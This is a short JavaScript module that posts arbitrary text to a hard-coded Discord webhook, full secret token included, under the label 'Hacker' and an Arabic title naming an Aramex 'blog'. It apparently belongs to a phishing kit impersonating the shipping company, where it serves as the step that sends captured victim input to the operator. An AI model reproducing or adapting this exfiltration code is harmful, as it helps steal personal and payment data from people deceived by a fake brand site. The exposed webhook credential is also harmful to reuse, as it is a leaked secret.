import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1316439617259573268/tMg3Z0DUL3L1PuCzKzYhP0PVOHbSlmFgg-MDuVTD9Czc3vyVLlXxOart-YhCy3dI9zKe",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
